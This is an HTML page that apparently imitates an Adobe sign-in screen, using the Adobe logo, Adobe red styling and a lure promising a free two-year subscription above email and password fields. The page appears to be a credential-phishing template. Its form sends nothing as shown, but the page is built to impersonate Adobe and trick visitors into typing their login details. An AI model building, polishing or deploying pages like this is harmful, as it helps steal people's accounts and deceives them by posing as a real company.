<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Get your free Adobe 2 years subscription now</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #f4f4f4, #e0e0e0);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      background: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 4px 25px rgba(0, 0, 0, 0.1);
      width: 360px;
      text-align: center;
      animation: fadeInUp 1s ease-in-out;
    }

    @keyframes fadeInUp {
      0% { opacity: 0; transform: translateY(30px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .logo {
      width: 80px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 25px;
      color: #222;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 14px;
      transition: border 0.3s;
    }

    input:focus {
      border-color: #ff0000; /* couleur Adobe rouge */
      outline: none;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background: #ff0000; /* couleur Adobe rouge */
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      cursor: pointer;
      font-weight: 600;
      transition: background 0.3s, transform 0.2s;
    }

    .btn:hover {
      background: #cc0000;
      transform: scale(1.05);
    }

    .small-links {
      margin-top: 20px;
      font-size: 13px;
    }

    .small-links a {
      color: #0066cc;
      text-decoration: none;
    }

    .small-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Adobe_Systems_logo_and_wordmark.svg" class="logo" alt="Adobe Logo" />
    <h1>Get your free Adobe 2 years subscription now</h1>
    <form>
      <input type="email" placeholder="Email" required />
      <input type="password" placeholder="Password" required />
      <button class="btn" type="submit">Log In</button>
    </form>
    <div class="small-links">
      <a href="#">Forgot password?</a>
      <br />
      <a href="#">Create an account</a>
    </div>
  </div>
</body>
</html>
